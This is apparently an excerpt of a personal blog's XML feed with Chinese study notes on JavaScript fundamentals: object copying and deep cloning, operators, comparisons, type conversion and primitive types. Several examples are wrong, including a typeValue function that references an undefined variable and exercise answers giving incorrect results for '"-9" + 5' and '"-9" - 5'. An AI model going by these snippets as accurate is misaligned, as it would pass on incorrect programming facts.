        <content type="html"><![CDATA[<p>把对象赋值给变量时，并不是在变量里存储了对象，而是在变量里存储了 ** 对象在内存中的地址 **。<br>所以对象的存储和引用的存储不是绑定的。</p><pre><code class="javascript">let user = {name: &#39;John&#39;};let admin = user;admin.name = &#39;Pete&#39;; // 通过 &quot;admin&quot; 引用来修改alert(user.name); // &#39;Pete&#39;，修改能通过 &quot;user&quot; 引用看到</code></pre><p>user 变量和 admin 变量就像带有两把钥匙的柜子，使用其中一把钥匙打开柜子做了变动，另一把钥匙后面打开柜子是，会看到之前的变动。</p><h1 id="字面量对象的相等性"><a href="#字面量对象的相等性" class="headerlink" title="字面量对象的相等性"></a>字面量对象的相等性</h1><p>只有当两个变量指向同一个对象时，才是相等的。</p><h1 id="克隆与合并"><a href="#克隆与合并" class="headerlink" title="克隆与合并"></a>克隆与合并</h1><p>最简单的方法：</p><pre><code class="javascript">let a = {    age: 99,    likes: [&quot;game&quot;, &quot;book&quot;],    action: function () {        console.log(this.likes);    },}let b = {    age: 9999,    link2: a,}a[&quot;link1&quot;] = b;a.action();let copy = {};for (let k in a) {    copy[k] = a[k];}for (let k in b) {    copy[k] = b[k];}console.log(copy);  // 循环引用可以正常复制, 不会报错copy.action();console.log(copy.action === a.action);  // trueconsole.log(copy.likes === a.likes);  // true</code></pre><p>缺点是引用类型（包括函数）都是直接复制的引用。</p><h2 id="Object-assign"><a href="#Object-assign" class="headerlink" title="Object.assign"></a>Object.assign</h2><p>与前面的简单方法一样。缺点也一样。</p><pre><code class="javascript">let copy = Object.assign({}, a, b);</code></pre><h2 id="深层克隆"><a href="#深层克隆" class="headerlink" title="深层克隆"></a>深层克隆</h2><p>如果某个属性的值也是一个对象，那么也要复制它的结构。这就叫 “深拷贝 “。</p><p><a href="https://segmentfault.com/a/1190000006687581" target="_blank" rel="noopener">参考文章</a></p><pre><code class="javascript">let a = [1,2,3];let f = function(){}let d = new Date();typeof a //&#39;object&#39;typeof f //&#39;function&#39;typeof d //&#39;object&#39;</code></pre><p>由于 typeof 无法判断 object 和 array。可以使用 <code>object.prototype.toString</code> 方法，但是直接使用 <code>实例对象. toString()</code> 调用时，数组还是返回的 <code>&quot;[object Object]&quot;</code>，时间 Date 的实例对象返回的是日期字符串。</p><p>** 所以，深复制的关键是递归调用和类型判断 **</p><pre><code class="javascript">let a = [1,2,3];let f = function(){}let d = new Date();ff.toString(); // &quot;function ff() {}&quot;d.toString(); // &quot;Mon Aug 02 2021 17:25:28 GMT+0800 (中国标准时间)&quot;a.toString(); // &quot;1,2,3&quot;</code></pre><p>原因是因为这些对象的的原型上已经覆盖了 <code>toString</code> 方法。<br>** 类型判断 ** 的一个解决方法是，使用 <code>Object.prototype.toString</code> 方法时绑定当前实例对象 Object 的 toString 方法上。</p><pre><code class="javascript">function typeValue(value) {    let typeMap = {        &#39;[object Array]&#39;: &#39;array&#39;,        &#39;[object Function]&#39;: &#39;function&#39;,        &#39;[object Object]&#39;: &#39;object&#39;,    }    return typeMap[Object.prototype.toString.call(obj)];}let a = [1,2,3];let f = function(){}let d = new Date();typeValue(f); // &#39;function&#39;typeValue(a); // &#39;array&#39;Object.prototype.toString.call(d); // &#39;[object Date]&#39;</code></pre><p>在进行值的复制时，就可以判断这个值是数组还是其他类型了。</p><pre><code class="javascript">function deepClone(value) {    let copy;  // 最终返回的复制后的值    function clone(value) {        if (typeValue(value) === &#39;array&#39;) {            let temp = [];            for (let e of value) {                // 属性值递归 clone                temp.push(clone(e));            }            return temp;        }        if (typeValue(value) === &#39;object&#39;) {            let temp = {};            // 加上这一句是因为 assign 方法可以看到 symbol 属性, 但是 for...in 看不到            Object.assign(temp, value);            for (let key in value) {                // 数组元素还需要再进行 clone                temp[key] = clone(value[key]);            }            return temp;        }        // 既不是数组，也不是对象 Object        return value;    }    copy = clone(value);    return copy;}</code></pre><p>此方法可以深复制一个嵌套了多个 ** 深度 ** 的对象。<br>由于 <code>Symbol</code> 属性的隐藏性，对 for…in 不可见，导致不能复制 Symbol 类型的属性。<br>而 <code>Object.assign</code> 属性却可以复制 Symbol 属性</p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对象 - Object 基础</title>
      <link href="2021/08/02/dui-xiang-object-ji-chu/"/>
      <url>2021/08/02/dui-xiang-object-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h1><h2 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h2><p>如果想在创建对象时，使用动态的属性名称，可以使用方括号包裹，就像在访问对象时那样。</p><pre><code class="javascript">let fruit = &quot;apple&quot;;let prices = {[fruit]: 5,}</code></pre><h2 id="属性值简写"><a href="#属性值简写" class="headerlink" title="属性值简写"></a>属性值简写</h2><p>如果对象的属性名称是已存在的变量，而其值就是这个已存在的变量的值时，可以：</p><pre><code class="javascript">function makeUser(name, age) {    return {        name,        age,    }}</code></pre><p>属性名简写方式和正常方式可以混用</p><h2 id="属性名限制"><a href="#属性名限制" class="headerlink" title="属性名限制"></a>属性名限制</h2><p>属性名 <code>__proto__</code> 被赋值为非对象值时，不会生效。</p><pre><code class="javascript">let obj = {};  // 不生效obj.__proto__ = 5;  // 不生效obj.__proto__ = undefined;  // 不生效obj.__proto__ = false;  // 不生效obj.__proto__ = &quot;word&quot;;  // 不生效obj.__proto__ = Symbol(&#39;dd&#39;);  // 不生效</code></pre><h2 id="属性存在性与-in-操作符"><a href="#属性存在性与-in-操作符" class="headerlink" title="属性存在性与 in 操作符"></a>属性存在性与 in 操作符</h2><p>访问 JavaScript 对象不存在的属性是，不会报错，只是得到 <code>undefined</code>。</p><pre><code class="javascript">let obj = {};user.age === undefined; // true 意思是没有这个属性</code></pre><p>操作符 “in”语法是：</p><pre><code class="javascript">&quot;key&quot; in object</code></pre><p>左边的属性名必须带引号，否则视为一个变量，判断时，key 是这个变量的值。</p><pre><code>let user = { name: &quot;John&quot;, age: 30 };let prop = &quot;age&quot;&quot;age&quot; in user; // trueprop in user; // true</code></pre><p>之所以会有 “in”操作符，是因为当属性对应的值就是 “undefined” 时。<br>不过，实际代码中通常使用 “null” 表示未知的值或空值（不管是不是对象类型）。</p><pre><code class="javascript">let sum = 0;let b = {... 7: 1,... &quot;+7&quot;: 2,... &quot;-7&quot; : 3,}for (k in b) {    sum += +k;}// sum  = 7</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>函数 - JavaScript 基础</title>
      <link href="2021/08/01/han-shu-javascript-ji-chu/"/>
      <url>2021/08/01/han-shu-javascript-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h1><p>技巧：默认值可以是一个函数，当调用者没有提供参数时，调用这个函数。</p><pre><code class="javascript">function dd(a, b, c = show()) {}function show() {    console.log(&quot;请提供三个参数&quot;);}dd(1); // 请提供三个参数dd(1, 2); // 请提供三个参数dd(1, 2, 3);</code></pre><h2 id="空值合并运算符"><a href="#空值合并运算符" class="headerlink" title="空值合并运算符"></a>空值合并运算符</h2><p>空值合并运算符返回第一个 ** 已定义 ** 的值。<br>逻辑或运算符返回第一个 ** 真 ** 值。</p><p>以前写赋值时，可能需要这么写：</p><pre><code class="javascrupt">result = (a !== null &amp;&amp; a != undefined) ? a : bresult = a ? a : b  // 如果 a 是 0 的话就赋值 b 给 result 了result = a || b  // 如果 a 是 0 的话就赋值 b 给 result 了</code></pre><p>就是说，逻辑或无法区分 <code>false, 0, &quot;&quot;, null, undefined</code>，他们对逻辑或来说都是假值。<br><code>a ?? b</code> 的运算结果：当 a 不是 undefined 或者 null 时，就会返回左边参数 a，否则返回右边的参数 b。</p><blockquote><p>在搭配其他运算符时，需要给空值运算符加上括号。</p></blockquote><h1 id="函数命名"><a href="#函数命名" class="headerlink" title="函数命名"></a>函数命名</h1><p>函数属于行为。所以函数名包含动词。一般做法是动词前缀。</p><pre><code class="javascript">getXxx 返回一个值calcXxx 计算任务createXxx 创建东西checkXxx 检查内容并返回布尔值</code></pre><blockquote><p>一个函数对应一个行为</p></blockquote><h1 id="函数表达式-VS-函数声明"><a href="#函数表达式-VS-函数声明" class="headerlink" title="函数表达式 VS 函数声明"></a>函数表达式 VS 函数声明</h1><ul><li>函数表达式是在代码执行到达函数表达式时被创建，并且仅从那一刻起才可用。</li><li>而在函数声明在声明之前，它就可以被调用。</li></ul><pre><code class="javascript">sm(); // OKfunction sm() {}bds();  // 报错let bds = function() {};</code></pre><p>之所以加了个函数表达式，是因为，有时函数声明不能做到的，函数表达式可以做到。</p><pre><code class="javascript">let age = 24;if (age &lt; 30) {    function jiaban() {        console.log(&quot;加班&quot;);    }} else {    function jiaban(){        console.log(&quot;退休&quot;);    }}jiaban();  // 错误，jiaban 未定义</code></pre><p>这是因为，函数声明作用域时代码块。<br>这时可以在代码块外面加一个变量，指向函数表达式。</p><pre><code class="javascript">let age = 24;let jiaban;if (age &lt; 30) {    jiaban = function () {        console.log(&quot;加班&quot;);    }} else {    jiaban = function(){        console.log(&quot;退休&quot;);    }}jiaban();  // 错误，jiaban 未定义</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑运算符 - JavaScript 基础</title>
      <link href="2021/08/01/luo-ji-yun-suan-fu/"/>
      <url>2021/08/01/luo-ji-yun-suan-fu/</url>
      
        <content type="html"><![CDATA[<h1 id="逻辑或"><a href="#逻辑或" class="headerlink" title="逻辑或"></a>逻辑或</h1><p>** 寻找第一个真值 **</p><p>逻辑或处理每一个逻辑或连接的操作数时，会将其转化为布尔值。如果有值为 true，就停止后面的处理，直接返回这个操作数原值（非转化后的布尔值）。<br>当所有操作数都是 false，则返回最后一个操作数。</p><pre><code class="javascript">let res = 0 || NaN || undefined || null; =&gt; null</code></pre><h2 id="逻辑或技巧"><a href="#逻辑或技巧" class="headerlink" title="逻辑或技巧"></a>逻辑或技巧</h2><ol><li>获取多个值中的第一个真值<pre><code class="javascript">let firstName = &quot;&quot;;let lastName = &quot;&quot;;let nickName = &quot;SuperCoder&quot;;alert(firstName || lastName || nickName || &quot;Anonymous&quot;); // SuperCoder</code></pre></li><li>短路求值<br>如果操作数不仅仅是一个值，而是一个有副作用的表达式，例如变量赋值或函数调用，那么这<br>一特性的重要性就变得显而易见了。</li></ol><h1 id="逻辑与"><a href="#逻辑与" class="headerlink" title="逻辑与"></a>逻辑与</h1><p>** 寻找第一个假值 **</p><p>逻辑与处理每一个逻辑与连接的操作数时，会将其转化为布尔值。如果有值为 false，就停止后面的处理，直接返回这个操作数原值（非转化后的布尔值）。<br>当所有操作数都是 true，则返回最后一个操作数。</p><blockquote><p>逻辑与 <code>&amp;&amp;</code> 优先级高于逻辑或 <code>||</code><br><code>a &amp;&amp; b || c &amp;&amp; d</code> 等价与 <code>(a &amp;&amp; b) || (c &amp;&amp; d)</code></p></blockquote><h1 id="逻辑非"><a href="#逻辑非" class="headerlink" title="逻辑非"></a>逻辑非</h1><p>运作方式：</p><ol><li>将操作数转化为布尔值</li><li>返回相反的布尔值</li></ol><p>利用这个特性。可以使用两个连着的逻辑非实现将某个值转化为布尔值：</p><pre><code class="javascript">!!null =&gt; false!!&quot;0&quot; =&gt; true</code></pre><blockquote><p>逻辑非优先级高于逻辑与 <code>&amp;&amp;</code> 和逻辑或 <code>||</code></p></blockquote><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><pre><code class="javascript">null || -1 &amp;&amp; 1 null || 2 &amp;&amp; 3 || 4alert(alert(1) || 2 || alert(3));alert(alert(1) &amp;&amp; alert(2));</code></pre><p>答案：</p><hr><pre><code class="javascript">null || -1 &amp;&amp; 1  =&gt; 1，优先级问题，先计算 - 1 &amp;&amp; 1, 结果再参与或运算null || 2 &amp;&amp; 3 || 4 =&gt; 3，优先级问题，先计算 2 &amp;&amp; 3，表达式变为 null || 3 || 4alert(alert(1) || 2 || alert(3)); =&gt; 先 1，后 2alert(alert(1) &amp;&amp; alert(2)); =&gt; 先 1，后 undefined。调用 alert 返回了 undefined</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基本类型的值的比较 - JavaScript 基础</title>
      <link href="2021/07/29/zhi-de-bi-jiao/"/>
      <url>2021/07/29/zhi-de-bi-jiao/</url>
      
        <content type="html"><![CDATA[<blockquote><p>相等性检查 <code>==</code> (包括严格相等) 和普通比较符 <code>&gt; &lt; &gt;= &lt;=</code> 的代码逻辑是相互独立的。</p></blockquote><a id="more"></a><h1 id="比较结果为-Boolean-类型"><a href="#比较结果为-Boolean-类型" class="headerlink" title="比较结果为 Boolean 类型"></a>比较结果为 Boolean 类型</h1><hr><h1 id="字符串之间的比较"><a href="#字符串之间的比较" class="headerlink" title="字符串之间的比较"></a>字符串之间的比较</h1><p>字符串之间的比较是指，两边都是字符串！<br>此时，两个字符串时按照字符从左至右，进行逐个比较的。<br>字符的大小取决于 JS 的内部编码表 - Unicode。<br>汉字也是有 Unicode 表示的。</p><pre><code class="javascript">&#39;大&#39; &lt; &#39;小&#39; =&gt; true</code></pre><h1 id="不同类型之间的比较"><a href="#不同类型之间的比较" class="headerlink" title="不同类型之间的比较"></a>不同类型之间的比较</h1><p>待比较的两边有一个字符串或没有字符串时，统一转化为数字 number 类型，再判定大小。<br><a href="/images/post/lei-xing-zhuan-huan/">基本类型的值转换为 number 的转换规则</a></p><pre><code class="javascript">&quot;0b10&quot; == 2 =&gt; true0 &lt; true =&gt; true1 &gt; false =&gt; true0 &lt; &#39;a&#39; =&gt; false（&#39;a&#39;转换为 number 就是 NaN）</code></pre><p>BigInt 与非 BigInt 进行比较，会将 BigInt 转为 number 类型：</p><pre><code class="javascript">9007199254740992n == 2**53 + 1 =&gt; trueNumber(9007199254740992n) == 2**53 + 1 =&gt; true</code></pre><p>NaN 与任何类型, 包括自身比较，都返回 false</p><pre><code class="javascript">NaN &gt; NaN =&gt; falseNaN == NaN =&gt; falseNaN &lt; NaN =&gt; falseNaN === NaN =&gt; false</code></pre><h1 id="严格相等与严格不相等"><a href="#严格相等与严格不相等" class="headerlink" title="严格相等与严格不相等"></a>严格相等与严格不相等</h1><p>严格相等两边都是同一类型的数值时，结果与普通相等完全一样的。<br>但是严格相等在比较同一类型的数值时，不会进行任何类型转换。<br>如果两边的数不是同一个数据类型，严格相等会立刻返回 false。<br><code>undefined</code> 和 <code>null</code> 与自身严格相等</p><pre><code class="javascript">undefined === undefined =&gt; truenull === null =&gt; true</code></pre><h1 id="对-null-和-undefined-进行比较"><a href="#对-null-和-undefined-进行比较" class="headerlink" title="对 null 和 undefined 进行比较"></a>对 null 和 undefined 进行比较</h1><p>实际中，要检查变量是否是 null 和 undefined</p><h2 id="普通相等-比较-null-与-undefined"><a href="#普通相等-比较-null-与-undefined" class="headerlink" title="普通相等 == 比较 null 与 undefined"></a>普通相等 <code>==</code> 比较 null 与 undefined</h2><p>存在特殊的规则</p><pre><code class="javascript">null == undefined =&gt; truenull == 0 =&gt; falseundefined == 0 =&gt; false</code></pre><p>undefined 和 null 在相等性检查 == 中不会进行任何的类型转换，它们有自己独立的比较规则，所以 *<em><code>null</code> 与 <code>undefined</code> 之间互等外，不会等于任何其他的值 *</em></p><pre><code class="javascript">null == null =&gt; trueundefined == undefined =&gt; truenull == undefined =&gt; true</code></pre><p>*<em>undefined 只与 null 和 undefined 相等 *</em></p><h2 id="非直接相等比较时"><a href="#非直接相等比较时" class="headerlink" title="非直接相等比较时"></a>非直接相等比较时</h2><ul><li>null 转换为数字 <code>0</code></li><li>undefined 转换为 <code>NaN</code></li></ul><p>由于相等的比较逻辑与其他比较符号不同，所以会出现：</p><pre><code class="javascript">null &gt; 0 -&gt; falsenull &lt; 0 -&gt; falsenull &gt;= 0 -&gt; true（null 转为 number 类型就是 0）null &lt;= 0 -&gt; true</code></pre><p>undefined 就不用看了，因为 undefined 转换为数值类型是 NaN，而 NaN 不等于任何 number 类型，不管和哪个值比较，比较结果都是 false。</p><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><pre><code class="javascript">&quot;apple&quot; &gt; &quot;pineapple&quot; → false&quot;2&quot; &gt; &quot;12&quot; → true（两边都是字符串，首位 &quot;2&quot; &gt; &quot;1&quot;）undefined == null → trueundefined === null → false（不同类型）null == &quot;\n0\n&quot; → false（null 只与自身和 undefined 相等）null === +&quot;\n0\n&quot; → false（不同类型）</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运算符 - JavaScript 基础</title>
      <link href="2021/07/29/yun-suan-fu/"/>
      <url>2021/07/29/yun-suan-fu/</url>
      
        <content type="html"><![CDATA[<h1 id="运算符"><a href="#运算符" class="headerlink" title="+ 运算符"></a><code>+</code> 运算符</h1><h2 id="用来连接字符串"><a href="#用来连接字符串" class="headerlink" title="用来连接字符串"></a>用来连接字符串</h2><p>只要任意一个运算元是字符串，整个运算结果就是字符串。</p><pre><code class="javascript">1 + &quot;2&quot; =&gt; &quot;12&quot;&quot;2&quot; + 1 =&gt; &#39;12&quot;</code></pre><p>但是，当多个连接时，会按照运算符的运算顺序来求值。</p><pre><code class="javascript">1 + 2 + &quot;0&quot; =&gt; &quot;30&quot;</code></pre><p>在这里，运算符是按顺序工作。第一个 + 将前两个数值 number 相加，得到 3，然后才是和字符串的 + 运算，3 被转换为 <code>&quot;3&quot;</code>，所以是 <code>&quot;30&quot;</code>。</p><h2 id="用来数字转化"><a href="#用来数字转化" class="headerlink" title="用来数字转化"></a>用来数字转化</h2><p>作为一元运算符时，可用作数字转化。<br>作用到 number 类型上无任何效果。<br>作用在其他类型上，等同于 <code>Number(...)</code>，可以视为更简洁的 number 显示转换方法</p><pre><code class="javascript">&quot;2&quot; + &quot;3&quot; =&gt; &quot;23&quot;+&quot;2&quot; + +&quot;3&quot; =&gt; 5Number(&quot;2&quot;) + Number(&quot;3&quot;) =&gt; 5</code></pre><p>这里涉及运算符优先级问题。</p><h1 id="其他算术运算符"><a href="#其他算术运算符" class="headerlink" title="其他算术运算符"></a>其他算术运算符</h1><p>减，乘，除，取余，幂运算：<code>-,*,/,%,**</code> 都只对数字起作用，总是将运算元尝试转换为 number。转换不成功结果为 NaN</p><pre><code class="javascript">12 * &quot;a&quot; =&gt; NaN12 / &quot;a&quot; =&gt; NaN12 - &quot;a&quot; =&gt; NaN12 % &quot;a&quot; =&gt; NaN12 ** &quot;a&quot; =&gt; NaN</code></pre><h1 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h1><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Operator_Precedence" target="_blank" rel="noopener">表</a><br>所有一元运算符优先级高于任何二元运算符。</p><h1 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h1><p><code>=</code> 是一个运算符，而不是一个有着 “魔法” 作用的语言结构<br>从优先级表中可以看到它的优先级非常低，只有 3</p><h1 id="自增自减同-C-语言"><a href="#自增自减同-C-语言" class="headerlink" title="自增自减同 C 语言"></a>自增自减同 C 语言</h1><h1 id="位操作"><a href="#位操作" class="headerlink" title="位操作"></a>位操作</h1><p>位操作把运算元视为 32 位整数。</p><p>按位与，或，异或 <code>^</code>，非 <code>~</code><br>左移，右移，无符号右移</p><h1 id="逗号运算符"><a href="#逗号运算符" class="headerlink" title="逗号运算符"></a>逗号运算符</h1><p>逗号运算符，处理多个语句，返回结果是最后那个语句</p><pre><code class="javascript">let a = (1+2, 9+9)a =&gt; 18</code></pre><p>逗号运算符优先级是所有运算符里最低的，是 1</p><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p>下面这些表达式的结果是什么？</p><pre><code class="javascript">&quot;&quot;+ 1 + 0&quot;&quot; - 1 + 0true + false6 / &quot;3&quot;&quot;2&quot; * &quot;3&quot;4 + 5 + &quot;px&quot;&quot;$&quot; + 4 + 5&quot;4&quot; - 2&quot;4px&quot; - 27 / 0&quot;-9&quot; + 5&quot;-9&quot; - 5null + 1undefined + 1&quot;\t \n&quot; - 2</code></pre><hr><p>答案：</p><pre><code class="javascript">&quot;&quot;+ 1 + 0 =&gt;&quot;10&quot;&quot;&quot; - 1 + 0 =&gt; -1true + false =&gt; 1（不是字符串，自然都转 number）6 / &quot;3&quot; =&gt; 2&quot;2&quot; * &quot;3&quot; =&gt; 64 + 5 + &quot;px&quot; =&gt; &quot;9px&quot;&quot;$&quot; + 4 + 5 =&gt; &quot;$45&quot;&quot;4&quot; - 2 =&gt; 2&quot;4px&quot; - 2 =&gt; NaN7 / 0 =&gt; infinity&quot;-9&quot; + 5 =&gt; &quot;-9 5&quot;&quot;-9&quot; - 5 =&gt; &quot;-14&quot;null + 1 =&gt; 1undefined + 1 =&gt; NaN&quot;\t \n&quot; - 2 =&gt; -2 （字符串在转为 number 时，去掉两端空白字符，若剩余空字符，则转为 0）</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类型转换 - JavaScript 基础</title>
      <link href="2021/07/29/lei-xing-zhuan-huan/"/>
      <url>2021/07/29/lei-xing-zhuan-huan/</url>
      
        <content type="html"><![CDATA[<h1 id="字符串转换"><a href="#字符串转换" class="headerlink" title="字符串转换"></a>字符串转换</h1><p>当需要一个字符串形式值时，就会进行字符串转换。<br>也可以显式转换，调用 <code>String(待转换的值)</code></p><h1 id="数值型转换"><a href="#数值型转换" class="headerlink" title="数值型转换"></a>数值型转换</h1><p>在算术运算函数和算术表达式中，自动进行 number 类型转换。<br>例如，乘法用于 sting 类型</p><pre><code class="javascript">&quot;2&quot; * &quot;9&quot; =&gt; 18</code></pre><p>可以使用显示转换 <code>Number(待转换的值)</code>. 如果待转换值不是有效的数字，则结果 NaN。</p><pre><code class="javascript">Number(&quot;dddd&quot;) =&gt; NaN</code></pre><p>基本值转换为 number 时的规则：<br><strong>undefined - NaN</strong><br>null - 0<br>true - 1<br>false - 0<br>symbol - 直接报错<br>string 比较特殊，自动去掉首尾空白字符，若剩余空，则结果 0，否则，继续读取数字。若有非数字字符，则返回 NaN。</p><pre><code class="javascript">Number(&quot;e333&quot;) =&gt; NaNNumber(&quot;333e&quot;) =&gt; NaNNumber(&quot;333&quot;) =&gt; 333</code></pre><h1 id="布尔值转换"><a href="#布尔值转换" class="headerlink" title="布尔值转换"></a>布尔值转换</h1><p>比上面的转换都简单。<br>也可以通过调用 Boolean(value) 显式地进行转换。<br>只会发生在逻辑运算中，注意，严格相等并不是逻辑运算。不要以为 <code>null === false =&gt; false</code> 就以为 null 在逻辑运算中不会被转换为 false<br>抓换规则：<br>false 有 5 个：<code>0, &quot;&quot;, undefined, NaN, null</code><br>true - 其他基本类型的值</p><blockquote><p>非空字符串总是 true，<code>&quot;&quot;,&quot;0&quot;,&quot;null&quot;,&quot;undefined&quot;</code> 都是 true。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基本数据类型 - JavaScript 基础</title>
      <link href="2021/07/29/javascript-ji-chu/"/>
      <url>2021/07/29/javascript-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="“use-strict”"><a href="#“use-strict”" class="headerlink" title="“use strict”"></a>“use strict”</h1><p>没有类似于 “no use strict” 这样的指令可以使程序返回默认模式。<br>一旦进入了严格模式，就没有回头路了。</p><hr><h1 id="浏览器控制台多行输入"><a href="#浏览器控制台多行输入" class="headerlink" title="浏览器控制台多行输入"></a>浏览器控制台多行输入</h1><p>搭配使用 Shift+Enter 按键去输入多行代码，</p><pre><code class="javascript">&#39;use strict&#39;; &lt;Shift+Enter 换行&gt;// ... 你的代码&lt;按下 Enter 以运行&gt;</code></pre><hr><h1 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h1><hr><h2 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h2><blockquote><p>JS 的数学运算是安全的。我们可以做任何事：除以 0，将非数字字符串视为数字，等等。<br>脚本永远不会因为一个致命的错误（“死亡”）而停止。<br>最坏的情况下，我们会得到 NaN 的结果。</p></blockquote><hr><h3 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h3><p>Infinity 代表数学概念中的 无穷大∞。是一个比任何数字都大 (并不是) 的特殊值。表示比 JS 中任何数都大的数。</p><pre><code class="javascript">1 / 0 =&gt; Infinity1 / -0 =&gt; -Infinity1 - Infinity =&gt; -InfinityInfinity &gt; Infinity =&gt; falseInfinity == Infinity =&gt; trueInfinity === Infinity =&gt; trueInfinity &lt; Infinity =&gt; false</code></pre><p>Infinity 与 Infinity 自身的运算</p><pre><code class="javascript">Infinity - Infinity =&gt; NaNInfinity * Infinity =&gt; InfinityInfinity + Infinity =&gt; InfinityInfinity * Infinity =&gt; Infinity</code></pre><hr><h3 id="NaN"><a href="#NaN" class="headerlink" title="NaN"></a>NaN</h3><p>NaN，<code>NaN</code> 表示数值类型计算错误。它是一个不正确的或者一个未定义的数学操作的结果。</p><pre><code class="javascript"> 2 / &quot;b&quot; =&gt; NaN</code></pre><p>运算出错得到 NaN 而不是什么 JS 错误！这个面试被问到了，JS 数值计算会报错吗？确定会报错？那 JS 也太脆弱了吧。<br>NaN 是粘性的。任何对 NaN 的进一步操作都会返回 NaN。</p><blockquote><p>特殊数值属于 number 类型<br>    <code>javascript    typeof Infinity =&gt; &#39;number&#39;    typeof NaN =&gt; &#39;number&#39;</code></p></blockquote><hr><h2 id="BigInt"><a href="#BigInt" class="headerlink" title="BigInt"></a>BigInt</h2><p>在 JS 中，“numner”类型 ** 无法精确表示 ** 大于 $2^{53} - 1 = 9007199254740991$ 和小于 $-(2^{53} - 1) = -9007199254740991$ 的 ** 整数 **。<br>可以看：</p><pre><code class="javascript">Number(9007199254740992) =&gt; 9007199254740992Number(9007199254740993) =&gt; 9007199254740992Number(9007199254740994) =&gt; 9007199254740994Number(9007199254740995) =&gt; 9007199254740996</code></pre><p>有时我们需要很大的 ** 整数 **，例如用于加密或微秒精度的时间戳。</p><p>BigInt 类型用于表示 ** 任意长度的整数 **。</p><pre><code>typeof 10n =&gt; &quot;bigint&quot;</code></pre><p>可以通过将 <code>n</code> 附加到整数字段的末尾来创建 BigInt 值</p><p>主流浏览器已经全面支持 BigInt，IE 除外</p><p>BigInt 运算时，不能与 number 类型混合运算。只能 BigInt 与 BigInt 运算。</p><hr><h2 id="String"><a href="#String" class="headerlink" title="String"></a>String</h2><p>三种包含字符串方式：</p><ol><li>单引号</li><li>双引号</li><li>反引号</li></ol><p>反引号是 功能扩展 引号。它们允许我们通过将变量和表达式包装在 <code>${…}</code> 中。</p><blockquote><p>JS 没有 character 类型。C 和 Java 中被称为 <code>char</code> 类型。</p></blockquote><hr><h2 id="Boolean"><a href="#Boolean" class="headerlink" title="Boolean"></a>Boolean</h2><hr><h2 id="null-值"><a href="#null-值" class="headerlink" title="null 值"></a>null 值</h2><p>表示 “空”，“无” 值。<br>null 值不属于上述任何一种类型。构成一个独立的类型。<br>与 Java 相比，JavaScript 中的 null ** 不是 ** 一个 “对不存在的 object 的引用” 或者 “空<br>指针”。<br>虽然 <code>typeof null === &#39;object&#39;</code>，但是 null 不是一个 object。null 是特殊值。</p><hr><h2 id="undefined-值"><a href="#undefined-值" class="headerlink" title="undefined 值"></a>undefined 值</h2><p>表示“未被赋值”。<br>与 null 一样自成一派。<br>不建议显式的给变量赋值为 undefined。</p><hr><h1 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h1><pre><code>typeof alert =&gt; &quot;function&quot;typeof null =&gt; object</code></pre><ol><li>null 实际上并不是一个 object，这是 JS 的一个语言上的错误，为了兼容被一致保留下来。</li><li>虽然函数隶属于 object 类型。但是 typeof 会对函数区分对待，并返回 “function” 。这也是来自于 JavaScript 语言早期的问题。从技术上讲，这种行为是不正确的，但在实际编程中却非常方便。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试</title>
      <link href="2021/07/28/mian-shi/"/>
      <url>2021/07/28/mian-shi/</url>
      
